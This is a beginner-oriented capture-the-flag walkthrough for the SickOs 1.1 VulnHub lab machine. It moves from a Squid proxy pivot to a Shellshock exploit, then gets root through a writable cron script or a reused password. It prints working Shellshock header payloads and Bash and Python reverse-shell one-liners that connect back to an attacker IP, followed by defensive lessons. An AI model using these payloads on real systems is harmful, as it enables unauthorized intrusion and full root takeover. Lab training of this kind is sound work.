# SickOs: 1.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | SickOs: 1.1 |
| **Difficulty** | Easy / Intermediate |
| **Author** | D4rk |
| **Released** | December 11, 2015 |
| **VulnHub Entry** | [SickOs: 1.1 on VulnHub](https://vulnhub.com/entry/sickos-11,132/) |
| **Download** | [SickOs: 1.1 OVA](https://vulnhub.com/entry/sickos-11,132/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu 12.04 era) |

> **Goal:** get `root` and read the flag in `/root/a0216ea4d51874464078c618298b1367.txt`.
> **Note on IPs:** the target IP varies by build. This guide uses `192.168.56.101` as the example target and `192.168.56.10` as the example attacker. Replace both with the addresses you actually discover.

## 0. What you will learn

- **Proxy pivoting:** how an open Squid proxy on port 3128 lets you (and your tools) reach a web server that is *not* directly exposed.
- **Port scanning through a proxy:** using Nmap, Metasploit, or a small scanner to map services hidden behind the proxy.
- **Shellshock (CVE-2014-6271):** what the Bash environment-variable bug is, and why CGI scripts are the classic target.
- **Exploiting via HTTP headers:** injecting a payload into `User-Agent` / `Referer` so Apache hands it to Bash.
- **Reverse shells:** converting command execution into a stable interactive shell.
- **Cron-job privilege escalation:** a root cron job running a world-writable script every minute.
- **Password reuse:** the same DB password working for an OS account — and that account having `sudo ALL`.
- **Defensive thinking:** how each finding would be prevented in a real environment.

## 1. Reconnaissance — finding the target

Find your own IP and the target's IP on the lab network.

**Check your (attacker) IP:**
```bash
ip a
```

> **How to read it:** Shows your interfaces. The `192.168.56.x` address on your host-only/NAT interface is your attacker IP (here `192.168.56.10`).

**Discover live hosts:**
```bash
sudo arp-scan --localnet
# or
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** A new Linux host on the subnet is your SickOs VM. Confirm it responds:
```bash
ping -c 2 192.168.56.101
```

![host discovery showing the target IP](images/01-recon.png)

## 2. Enumeration — open ports and services

### 2.1 Service scan
```bash
sudo nmap -sC -sV -p- --min-rate 1000 -T4 -oA scans/full 192.168.56.101
```

Realistic output (exact banners may vary by build):
```text
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```

> **How to read it:** Only two ports answer directly: SSH (22) and a **Squid HTTP proxy** (3128). There is no web server visible on port 80 yet.
> **Why it works:** Squid on 3128 means the box is acting as a forward proxy. If it is misconfigured to allow anyone to use it, we can **pivot** through it and reach services bound to `localhost` — including a web server we cannot see directly.

### 2.2 The proxy reveals a hidden web server
Set your browser (or `curl`) to use the proxy and request the target's own `localhost`:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/
```

> **Why it works:** The request goes *from the target* to `127.0.0.1`, so it reaches services only listening on the loopback interface. A page comes back — there is a web server on port 80 that was invisible in our direct scan.
> If the connection is refused, the proxy may be restricting which ports it will forward; try the explicit port (`http://127.0.0.1:80/`).

Port-scan the loopback through the proxy to find all hidden ports:
```bash
nmap --proxy http://192.168.56.101:3128 -sT -Pn -p 22,80,631,3306 127.0.0.1
```

> **How to read it:** `--proxy` sends Nmap's TCP connect scans through Squid. This typically reveals **80** (web), **631** (CUPS printing), and **3306** (MySQL) that a normal external scan missed.
> **Why it works:** `-sT` (connect scan) works over a proxy because Squid performs the actual TCP connection on our behalf.

![Squid proxy revealing the internal web server](images/02-proxy-pivot.png)

### 2.3 Enumerate the hidden web server (through the proxy)
Brute-force directories via the proxy:
```bash
gobuster dir --proxy http://192.168.56.101:3128 -u http://127.0.0.1/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
```text
/cgi-bin/            (Status: 403)
/index.php           (Status: 200)
/robots.txt          (Status: 200)
/server-status       (Status: 200)
```

Check `robots.txt`:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/robots.txt
```
```text
User-agent: *
Disallow: /wolfcms
```

> **How to read it:** `robots.txt` hides a `/wolfcms` CMS installation. Directory listing of `/cgi-bin/` is enabled, and `/server-status` (an Apache status page) is exposed.

Run Nikto through the proxy:
```bash
nikto -h http://127.0.0.1/ -useproxy http://192.168.56.101:3128
```
```text
+ Server: Apache/2.2.22 (Ubuntu)
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6278).
```

> **Why it works:** `/cgi-bin/status` is a CGI script. CGI scripts often run under Bash, and Nikto has fingerprinting that detects the Shellshock vulnerability. A request to that path returns the output of commands like `uptime` and `uname -a`.

![Nikto reporting Shellshock in /cgi-bin/status](images/03-nikto-shellshock.png)

## 3. Foothold — Shellshock

### 3.1 What is Shellshock?
Bash lets you define functions via environment variables. In vulnerable versions (Bash ≤ 4.3), if an environment variable contains a function definition followed by extra commands, Bash **executes those extra commands**. Before running a CGI script, Apache copies HTTP headers (such as `User-Agent` and `Referer`) into environment variables. Those headers are fully attacker-controlled — so we can smuggle a command in.

> **Why it works:** We do not need any credentials. Any header Apache passes to the CGI script is a potential injection point. The classic CVE is **CVE-2014-6271** (and the related **CVE-2014-6278**).

### 3.2 Prove command execution
Send a request whose `User-Agent` contains a payload that runs `id`:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/cgi-bin/status \
  -H "User-Agent: () { :;}; echo; echo; /usr/bin/id"
```

Realistic response (the JSON output is polluted by our command output):
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{"uptime":"...","uname":"Linux SickOs ..."}
```

> **How to read it:** `uid=33(www-data)` proves our injected command executed as the web user. The `() { :;}` part defines an empty Bash function; the `;` and everything after is the injected command.
> Some builds respond better with the `Referer` header or the newer `() { :;};` syntax — try both if needed.

### 3.3 Get a reverse shell
Start a listener:
```bash
nc -lvnp 443
```

Send the payload. A simple Bash reverse shell works well:
```bash
curl --proxy http://192.168.56.101:3128 http://127.0.0.1/cgi-bin/status \
  -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.56.10/443 0>&1"
```

> **Why it works:** `/dev/tcp/host/port` is a Bash feature that opens a TCP socket. `>&` duplicates the socket onto stdout/stderr, so the target's shell connects back to our listener on port 443. The proxy carries the malicious request; the *shell connection itself goes directly* from target to attacker.

Listener output:
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 59312
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Note:** if the bash shell payload does not connect, generate an equivalent with `msfvenom -p cmd/unix/reverse_bash LHOST=192.168.56.10 LPORT=443 -f raw` (and change `sh` to `/bin/sh` if needed), or use a Python reverse shell.

![Shellshock reverse shell as www-data](images/04-shellshock-shell.png)

## 4. Privilege escalation — www-data to root

There are two well-known paths. Both are worth knowing.

### 4.1 Path A — root cron job running a writable script
List the cron directories:
```bash
ls -la /etc/cron.d/
cat /etc/cron.d/automate
```
```text
* * * * * root /usr/bin/python /var/www/connect.py
```

> **How to read it:** A cron job runs `/usr/bin/python /var/www/connect.py` **every minute as root**. Check the script's permissions:
```bash
ls -la /var/www/connect.py
```
> If `www-data` can write to it, we replace its contents with a Python reverse shell. When cron runs it as root a minute later, we get a root shell.

Overwrite the script with a Python reverse shell (single line):
```bash
echo "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('192.168.56.10',443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])" > /var/www/connect.py
```

> **Why it works:** Because the file is world-writable, `www-data` can change what root will execute. `connect.py` is normally just a harmless status script, but we control its contents.

Start another listener and wait up to a minute:
```bash
nc -lvnp 443
```
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 46650
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** The cron daemon runs the job as `root` with no interactive login; the Python payload connects back and gives us a root shell.

### 4.2 Path B — password reuse → `sudo ALL`
The WolfCMS install stores database credentials in `config.php`:
```bash
cat /var/www/wolfcms/config.php
```
```text
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
```

Enumerate local users (`/etc/passwd`) — the only real user is `sickos`. Try the DB password for that account:
```bash
su - sickos      # password: john@123
```

> **Why it works:** The admin reused the database password for the OS user `sickos`. Now check what `sickos` can do:
```bash
sudo -l
```
```text
User sickos may run the following commands on this host:
    (ALL : ALL) ALL
```

> **How to read it:** `(ALL : ALL) ALL` means `sickos` may run **any** command as **any** user — including root:
```bash
sudo su -
```
```text
root@SickOs:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 Capture the flag
```bash
ls -la /root
cat /root/a0216ea4d51874464078c618298b1367.txt
```
```text
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
```

> **Note:** the exact flag filename and text are specific to this VM, but confirm the contents on your own build — never assume.

![root shell and flag](images/05-root-flag.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE / Type | Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| Open Squid forward proxy | Misconfiguration | Squid 3.1.19 | 3128 | Network pivot to hidden services | Lets anyone reach `localhost`-bound services |
| Hidden web server / CMS | Misconfiguration | Apache 2.2.22, WolfCMS | 80 (via proxy) | Expands attack surface | `/robots.txt` leaks `/wolfcms` |
| Shellshock | CVE-2014-6271 / CVE-2014-6278 | Bash via Apache CGI | 80 (via proxy) | Remote Code Execution | `/cgi-bin/status` is the vector |
| Root cron running writable script | Misconfiguration | `/etc/cron.d/automate` → `/var/www/connect.py` | — | Local Privilege Escalation → root | World-writable script executed by root every minute |
| Credentials in web-readable file | Sensitive data exposure | `/var/www/wolfcms/config.php` | 80 | DB credentials (`root:john@123`) | Root of the CMS secret leak |
| Password reuse | Weak practice | OS account `sickos` | 22 | Account compromise | DB password reused for the user |
| Over-privileged sudo | Misconfiguration | `sickos` sudoers entry | — | Full root via `sudo su` | `(ALL : ALL) ALL` |

> **How to read it:** Two independent privilege-escalation paths exist by design — a world-writable root cron target and a reusable password plus unlimited `sudo`. Either one leads to root.

## 6. Defensive lessons (blue team)

- **Do not run an open proxy.** If Squid is required, restrict it with `acl` rules to trusted networks and disable forwarding to loopback/private ranges. An open proxy hides and exposes internal services.
- **Patch Bash.** Shellshock was fixed in Bash 4.3 patch 25 onwards; apply security updates across every host and container image.
- **Disable or harden CGI.** Prefer modern application servers over CGI. If you must use CGI, run it in a sandbox with minimal privileges and never pass raw HTTP headers into a shell.
- **Keep secrets out of the web root.** `config.php` should not be browsable and should not contain OS passwords.
- **Never reuse passwords** across databases, applications, and OS accounts. Use a secrets manager and unique credentials.
- **Apply least privilege to `sudo`.** Grant only the specific commands a user needs. `(ALL : ALL) ALL` for a service account is effectively root.
- **Protect cron-executed scripts.** They must be owned by root and **not writable** by non-root users. Audit scheduled jobs for path and permission issues.
- **Upload/serve files safely and monitor egress.** Reverse shells create outbound connections — alert on unexpected outbound traffic from servers.
- **Patch management and inventory:** document service versions (an ancient Squid, Apache, and OpenSSH are all patch-hygiene failures here).

## 7. References

Real community writeups consulted during research (same path):

- [SickOs 1.1 — Christophe Tafani-Dereeper](https://blog.christophetd.fr/write-up-sickos-1-1/)
- [SickOS 1.1 Walkthrough — highon.coffee / Arr0way](https://highon.coffee/blog/sickos-1-walkthrough/)
- [SickOS 1 – VulnHub Writeup — ziomsec](https://ziomsec.com/writeups/vulnhub/sickos-1.1/)
- [SickOs: 1.1 VulnHub Writeup — g0blin Research](https://g0blin.co.uk/sickos-1-1-vulnhub-writeup/)
- [Rooting SickOS 1.1 — phi10s](https://www.phi10s.com/2018/02/rooting-sickos-11.html)
- [VulnHub – SickOs: 1.1 – Writeup (OSCP Friendly) — Dr. P1ng](https://drp1ngblog.es/vulnhub-sickos-1-1-writeup-oscp-friendly/)
- [VulnHub Official Entry — SickOs: 1.1](https://vulnhub.com/entry/sickos-11,132/)

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — host discovery showing the target IP
- [ ] `images/02-proxy-pivot.png` — Squid proxy revealing the hidden web server
- [ ] `images/03-nikto-shellshock.png` — Nikto reporting Shellshock on `/cgi-bin/status`
- [ ] `images/04-shellshock-shell.png` — reverse shell as `www-data`
- [ ] `images/05-root-flag.png` — root shell and the flag file in `/root`

> **How to read it:** Put screenshots in `labs/sickos-11/images/` and reference them with relative paths as shown above.

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
